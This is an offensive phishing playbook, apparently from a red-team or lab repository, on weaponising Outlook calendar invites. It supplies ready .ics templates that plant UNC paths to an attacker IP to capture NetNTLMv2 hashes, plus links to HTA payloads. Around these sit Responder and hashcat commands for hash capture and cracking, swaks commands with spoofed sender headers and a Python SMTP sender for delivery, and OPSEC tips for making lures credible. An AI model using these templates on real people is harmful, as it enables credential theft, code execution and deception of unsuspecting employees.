# Calendar Phishing (.ics) — NTLM Coercion & HTA Delivery

`.ics` (iCalendar) files are processed by Outlook with high trust. When opened they auto-import as calendar events — no warning prompt in most default configurations. This makes them ideal for NTLM coercion and payload delivery.

---

## Template 1: NTLM Hash Capture via UNC Path

Outlook auto-resolves UNC paths in the `LOCATION:` field when rendering a calendar invite. This triggers an SMB authentication request — your Responder captures the NetNTLMv2 hash.

```
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//Microsoft Corporation//Outlook 16.0 MIMEDIR//EN
METHOD:REQUEST
BEGIN:VEVENT
DTSTART:20260310T090000Z
DTEND:20260310T100000Z
SUMMARY:Quarterly Business Review — Action Required
DESCRIPTION:Please review the attached agenda before the meeting.
LOCATION:\\192.168.45.202\share\agenda.pdf
ORGANIZER;CN="IT Department":mailto:it@corp.com
ATTENDEE;CN="Target User":mailto:target@corp.com
END:VEVENT
END:VCALENDAR
```

**Kali — start Responder BEFORE sending the .ics:**
```bash
sudo responder -I eth0 -wv
# Wait for Outlook to render the invite → NetNTLMv2 hash in console

# Crack the hash:
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Important notes:**
- The UNC path triggers when **Outlook renders the invite** — no user click required
- Firewalls that block port 445 outbound will prevent this (common in hardened environments)
- Use with `ntlmrelayx` instead of Responder if you want to relay rather than crack

---

## Template 2: HTA Payload Delivery via Calendar Link

Add a clickable URL in the `DESCRIPTION:` field that loads an HTA. When the user clicks the link from within the calendar invite, Outlook passes it to the default browser, which may trigger `mshta.exe`.

```
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//Microsoft Corporation//Outlook 16.0 MIMEDIR//EN
METHOD:REQUEST
BEGIN:VEVENT
DTSTART:20260310T140000Z
DTEND:20260310T150000Z
SUMMARY:IT Security Update — Required Action
DESCRIPTION:Click here to review the mandatory security update:\nhttp://192.168.45.202/update.hta\n\nThis update must be completed before Friday.
LOCATION:Conference Room 3B
ORGANIZER;CN="IT Security":mailto:security@corp.com
ATTENDEE;CN="Target":mailto:target@corp.com
END:VEVENT
END:VCALENDAR
```

**Kali — serve the HTA:**
```bash
# Put your HTA in the web root:
cp 02-phishing/hta/clickme.hta /var/www/html/update.hta
sudo python3 -m http.server 80
# OR use Apache
```

---

## Template 3: Embedded UNC + Clickable Link (Combined)

Maximizes chances — triggers hash capture on render AND offers payload link if victim clicks.

```
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//Microsoft Corporation//Outlook 16.0 MIMEDIR//EN
METHOD:REQUEST
BEGIN:VEVENT
DTSTART:20260315T100000Z
DTEND:20260315T110000Z
SUMMARY:Employee Recognition — Nomination Due Friday
DESCRIPTION:Nominate a colleague at: http://192.168.45.202/nominate.hta\n\nMeeting materials: \\192.168.45.202\files\agenda.docx
LOCATION:\\192.168.45.202\share\location.txt
ORGANIZER;CN="HR Team":mailto:hr@corp.com
ATTENDEE;CN="All Staff":mailto:all@corp.com
END:VEVENT
END:VCALENDAR
```

---

## Delivery: Swaks (Send via SMTP)

```bash
# Basic delivery — attach the .ics file:
swaks --to target@corp.com \
      --from it@corp.com \
      --server mail.corp.com \
      --header "Subject: Meeting Invitation: Quarterly Review" \
      --header "Content-Type: text/calendar; charset=UTF-8; method=REQUEST" \
      --attach-type "text/calendar" \
      --attach calendar_invite.ics

# With spoofed From/Reply-To headers:
swaks --to target@corp.com \
      --from "IT Department <it@corp.com>" \
      --header "Reply-To: it-real@attacker.com" \
      --header "X-Mailer: Microsoft Outlook 16.0" \
      --server mail.corp.com \
      --port 25 \
      --attach-type "text/calendar" \
      --attach calendar_invite.ics

# With authentication (if relay requires creds):
swaks --to target@corp.com \
      --from "no-reply@corp.com" \
      --server mail.corp.com \
      --auth LOGIN \
      --auth-user "user@corp.com" \
      --auth-password "Password123" \
      --attach-type "text/calendar" \
      --attach calendar_invite.ics
```

---

## Delivery: Python SMTP (Alternative)

```python
#!/usr/bin/env python3
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

smtp_server = "mail.corp.com"
smtp_port = 25
from_addr = "it@corp.com"
to_addr = "target@corp.com"

msg = MIMEMultipart()
msg['Subject'] = 'Meeting Invitation: Quarterly Review'
msg['From'] = from_addr
msg['To'] = to_addr

body = MIMEText("Please see the calendar invite attached.", 'plain')
msg.attach(body)

with open("calendar_invite.ics", "rb") as f:
    part = MIMEBase("text", "calendar", method="REQUEST")
    part.set_payload(f.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment", filename="invite.ics")
    msg.attach(part)

with smtplib.SMTP(smtp_server, smtp_port) as server:
    server.sendmail(from_addr, to_addr, msg.as_string())
    print(f"[+] Sent to {to_addr}")
```

---

## Outlook Behavior Reference

| Trigger | Result | Default Behavior |
|---------|--------|------------------|
| Open .ics file | Import event, render description | Auto-import in Outlook |
| LOCATION: UNC path | SMB auth request | Triggered on render (no click) |
| URL in DESCRIPTION | Clickable link | Click required |
| METHOD:REQUEST | "Accept/Decline" buttons | Adds urgency for user |
| Embedded attachment | File dropped in temp | Varies by policy |

---

## OPSEC Notes

- **UNC path coercion**: Only works if outbound SMB (445) is allowed. Many orgs block this to the internet but allow internal.
- **Method REQUEST**: Makes the invite look like an official meeting request — adds legitimacy.
- **Real domain display name**: Set `ORGANIZER;CN=` to a realistic name (IT, HR, Finance).
- **Timing**: Send during business hours (9-11am) for highest open rate. Use near-future `DTSTART` to create urgency.
- **Multiple targets**: Change only `ATTENDEE` field per target, keep the rest identical.
